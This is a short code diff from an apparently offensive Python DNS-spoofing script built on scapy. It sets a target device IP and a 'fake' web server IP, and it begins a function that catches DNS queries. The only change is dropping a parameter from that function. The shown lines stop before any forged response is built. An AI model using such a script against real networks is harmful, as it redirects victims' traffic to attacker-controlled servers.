@@ -3,7 +3,7 @@ from scapy.all import *
 target_ip = ""  # IP address of the target device
 fake_ip = ""   # IP address of your web server
 
-def dns_spoof(pkt,fake_ip):
+def dns_spoof(pkt):
 
     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
         dns_query = pkt.getlayer(DNS).qd.qname.decode()
